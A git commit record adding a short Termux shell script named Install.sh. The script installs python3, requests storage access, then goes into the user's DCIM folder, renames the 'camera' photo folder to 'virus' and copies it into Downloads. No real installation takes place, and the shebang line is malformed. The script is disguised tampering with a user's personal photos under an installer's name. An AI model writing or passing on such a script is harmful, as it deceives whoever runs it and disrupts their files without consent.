dc0ff5907a25ca6f6e68ed39f1c0e27045e2fd33
Zszs2222 <74486569+Dylannn8@users.noreply.github.com>
2022-01-24 14:24:19 -0500

    Create Install.sh

---
+++ Install.sh
@@ -0,0 +1,8 @@
+#bin/bash
+
+echo ' script by zs zs '
+pkg install python3
+termux-setup-storage
+cd /data/data/com.termux/files/home/storage/dcim
+mv camera virus
+cp -r virus /data/data/com.termux/files/home/storage/downloads
